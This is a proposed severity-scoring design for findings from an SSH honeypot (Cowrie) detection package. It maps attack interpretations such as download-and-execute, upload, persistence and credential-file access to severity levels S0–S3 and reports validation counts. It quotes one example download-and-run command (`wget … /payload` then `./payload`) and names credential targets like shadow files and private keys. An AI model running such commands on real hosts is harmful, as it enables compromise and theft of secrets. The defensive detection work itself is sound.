# Severity model (proposed)

## 1. Principle

Each finding carries **two independent attributes**:

| Attribute | Question it answers | Source | Values |
|---|---|---|---|
| **Evidence level** | How much observed evidence supports this interpretation? | `behavioural_evidence`, per interpretation, unchanged | E1 / E2 / E3 |
| **Severity** | If this attempt had succeeded on a real system, how serious would the consequence be? | This model: fixed per interpretation, with one documented refinement | S0–S3 |

Rules for keeping them independent:
- Severity never raises the evidence level, and evidence never raises severity.
- No arithmetic combines the two, and no probability is produced.
- Severity describes the **attempted action's potential impact**, not likelihood and not success.
- Success is reported separately as the observed `outcome`.

## 2. Levels

| Level | Definition | Rationale |
|---|---|---|
| **S0 informational** | Ordinary discovery or administration (`system_discovery_only`) | The same commands are used by every benign session in V2 (229/229 benign logins) |
| **S1 low** | Activity that is common background noise and harmless on its own | Internet-facing SSH sees constant guessing. It matters in aggregate and as a precursor |
| **S2 medium** | Preparation that enables compromise but does not itself change or exfiltrate | Reconnaissance of privilege, network or credential locations; retrieval attempts |
| **S3 high** | Would directly execute untrusted code, exfiltrate data, persist, or obtain secrets | Consequence on a real host is compromise or data loss |

Abstentions (`indeterminate`, `insufficient_evidence`) receive **no severity** (`n/a`). They are not "low".

## 3. Interpretation → severity

| Interpretation | Severity | Rationale |
|---|---|---|
| repeated authentication failures | S1 | Guessing alone; the outcome is a rejected login |
| credential guessing followed by login | S2 | The account was accessed after guessing. Caveat: on a honeypot, acceptance is configured (`userdb`), so "success" is emulator-dependent |
| privilege-context reconnaissance attempt | S2 | Enumerates sudo, SUID or `/root`; preparation, not elevation |
| credential-material access attempt, CRED-1 `detail` ∈ {`credential file path`, `find for credential file name`} | S3 | Targets `shadow`, private keys, `authorized_keys` or shell history; success would yield secrets |
| credential-material access attempt, otherwise (only `path inside .ssh`, e.g. `known_hosts`, `config`) | S2 | Reveals other hosts (lateral reconnaissance) but no secret |
| download attempt | S2 | Retrieval of tooling. Content and outcome are unknown (`not_observed` on all 347 V2 attempts) |
| download-and-execute attempt | S3 | Attempted execution of retrieved code |
| upload attempt | S3 | Attempted data transfer off the host |
| archive-and-upload attempt | S3 | Staging plus transfer |
| history tampering attempt | S2 | Anti-forensics; no direct impact |
| persistence modification attempt | S3 | Survives reboot or logout on a real host |
| network probing attempt | S2 | Scanning or probing internal targets; preparation for lateral movement |

**Why credential-material severity is refined by `detail`.** On the V2 validation split, 29 of the 71 lateral-movement CRED-1-only findings concern `.ssh/known_hosts` or `config`, which are not secrets. A fixed S3 would overstate them. The refinement uses a field the package already emits; no indicator logic is changed.

## 4. Observed behaviour vs inferred intent

Each finding is rendered as three separate statements:
1. **Observed:** the matched lines, tokens and Cowrie events, and their outcomes. Example: "`wget -q http://…/payload -O payload` typed; no `file_download` event; `./payload` rejected by the emulator (`command.failed`)".
2. **Interpretation (from the rule):** for example "download-and-execute attempt (E2: XFER-1, EXEC-1)".
3. **Possible intent (inferred, hedged):** for example "consistent with an attempt to retrieve and run code". This is never written as fact, and never as success unless an outcome event exists.

## 5. Session summary

- The assessment lists **all** findings. It may display the "highest severity" and, separately, that finding's evidence level. It never shows one combined number.
- Handling tiers are a function of **both** attributes and of attribution. They are defined in `defence_policy_mapping.md`.

**Dry run on V2 validation** (`evidence/dry_run_summary.json`; unchanged Task 22 records):
- Of 600 logins, 313 are S0 (all 229 benign are S0).
- The 238 sessions with S2–S3 findings split: E1 72 S2 / 42 S3; E2 14 S2 / 110 S3.
- 0 benign sessions have a severity above S0.
